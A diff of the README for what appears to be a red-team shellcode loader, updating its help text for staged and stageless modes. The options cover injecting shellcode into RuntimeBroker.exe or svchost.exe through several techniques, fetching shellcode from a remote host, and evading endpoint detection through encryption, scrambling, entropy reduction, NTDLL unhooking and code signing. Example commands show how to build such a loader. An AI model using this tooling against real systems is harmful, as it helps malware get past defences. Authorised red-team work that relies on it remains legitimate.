@@ -105,71 +105,60 @@ options:
 Staged:
 
 ```
-usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] [-apc {RuntimeBroker.exe,svchost.exe}]
-                      [-inj {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT]
-                      [--https] [--user-agent USER_AGENT] [-e] [-s] [-er]
-                      [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+  -h, --help            show this help message and exit
+  -p, --payload PAYLOAD
+                        Shellcode to be packed
+  -f, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
+  -apc, --apc {RuntimeBroker.exe,svchost.exe}
+                        Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe
+  -inj, --inject-method {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}
+                        Choose injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2 callback), 'tp_direct' (PoolParty TP_DIRECT), 'wf_overwrite'
+                        (PoolParty WorkerFactory overwrite), 'timerqueue' (TimerQueue callback). Default: apc.
+  -i, --ip-address IP_ADDRESS
+                        IP address from where your shellcode is gonna be fetched.
+  -po, --port PORT      Port from where the HTTP connection is gonna fetch your shellcode.
+  -pa, --path PATH      Path from where your shellcode is gonna be fetched.
+  -o, --output OUTPUT   Output path where the shellcode is gonna be saved.
+  --https               Use HTTPS instead of HTTP for downloading shellcode.
+  --user-agent USER_AGENT
+                        Custom User-Agent string for HTTP/HTTPS requests.
+  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble        Scramble the loader's functions and variables.
+  -er, --entropy-reduction
+                        Reduce binary entropy by embedding English text padding.
+  --no-unhook           Disable NTDLL unhooking via Known DLLs technique.
+  -pfx, --pfx PFX       Path to the PFX file for signing the loader.
+  -pfx-pass, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
 
-options:
-  -h, --help                    show this help message and exit
-  -p PAYLOAD, --payload PAYLOAD
-                                Shellcode to be packed
-  -f {EXE,DLL}, --format {EXE,DLL}
-                                Format of the output file (default: EXE).
-  -apc {RuntimeBroker.exe,svchost.exe}
-                                Target injection process (default: RuntimeBroker.exe).
-  -inj {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}, --inject-method {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}
-                                Injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2
-                                callback), 'tp_direct' (PoolParty TP_DIRECT via IoCompletion),
-                                'wf_overwrite' (PoolParty WorkerFactory overwrite), or
-                                'timerqueue' (TimerQueue callback self-injection).
-                                Default: apc. tp_direct/wf_overwrite require an existing target process.
-  -i IP_ADDRESS, --ip-address IP_ADDRESS
-                                IP address from where your shellcode is gonna be fetched.
-  -po PORT, --port PORT         Port from where the HTTP connection is gonna fetch your shellcode.
-  -pa PATH, --path PATH         Path from where your shellcode is gonna be fetched.
-  -o OUTPUT, --output OUTPUT    Output path where the loader is gonna be saved.
-  --https                       Use HTTPS instead of HTTP for downloading the shellcode.
-  --user-agent USER_AGENT       Custom User-Agent string for HTTP/HTTPS requests.
-  -e, --encrypt                 Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble                Scramble the loader's functions and variables.
-  -er, --entropy-reduction      Reduce binary entropy by embedding English text padding.
-  -pfx PFX, --pfx PFX           Path to the PFX file for signing the loader.
-  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                                Password for the PFX file.
-
-Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -inj apc -e -s --https -pfx cert.pfx -pfx-pass 'password'
+Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s --https --user-agent
+'CustomAgent/1.0' -pfx cert.pfx -pfx-pass 'password'
 ```
 
 Stageless:
 
 ```
-usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-apc {RuntimeBroker.exe,svchost.exe}]
-                         [-inj {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}] [-e] [-s] [-er]
-                         [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+  -h, --help            show this help message and exit
+  -p, --payload PAYLOAD
+                        Shellcode to be packed
+  -f, --format {EXE,DLL}
+                        Format of the output file (default: EXE).
+  -apc, --apc {RuntimeBroker.exe,svchost.exe}
+                        Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe
+  -inj, --inject-method {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}
+                        Choose injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2 callback), 'tp_direct' (PoolParty TP_DIRECT), 'wf_overwrite'
+                        (PoolParty WorkerFactory overwrite), 'timerqueue' (TimerQueue callback). Default: apc.
+  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble        Scramble the loader's functions and variables.
+  -er, --entropy-reduction
+                        Reduce binary entropy by embedding English text padding.
+  --no-unhook           Disable NTDLL unhooking via Known DLLs technique.
+  -pfx, --pfx PFX       Path to the PFX file for signing the loader.
+  -pfx-pass, --pfx-password PFX_PASSWORD
+                        Password for the PFX file.
 
-options:
-  -h, --help                    show this help message and exit
-  -p PAYLOAD, --payload PAYLOAD
-                                Shellcode to be packed
-  -f {EXE,DLL}, --format {EXE,DLL}
-                                Format of the output file (default: EXE).
-  -apc {RuntimeBroker.exe,svchost.exe}
-                                Target injection process (default: RuntimeBroker.exe).
-  -inj {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}, --inject-method {apc,copyfile2,tp_direct,wf_overwrite,timerqueue}
-                                Injection method: 'apc' (EarlyBird APC), 'copyfile2' (CopyFile2
-                                callback), 'tp_direct' (PoolParty TP_DIRECT via IoCompletion),
-                                'wf_overwrite' (PoolParty WorkerFactory overwrite), or
-                                'timerqueue' (TimerQueue callback self-injection).
-                                Default: apc. tp_direct/wf_overwrite require an existing target process.
-  -e, --encrypt                 Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble                Scramble the loader's functions and variables.
-  -er, --entropy-reduction      Reduce binary entropy by embedding English text padding.
-  -pfx PFX, --pfx PFX           Path to the PFX file for signing the loader.
-  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                                Password for the PFX file.
-
-Example usage: python main.py stageless -p shellcode.bin -e -s -inj copyfile2 -pfx cert.pfx -pfx-pass 'password'
+Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'
 ```
 
 ### GUI
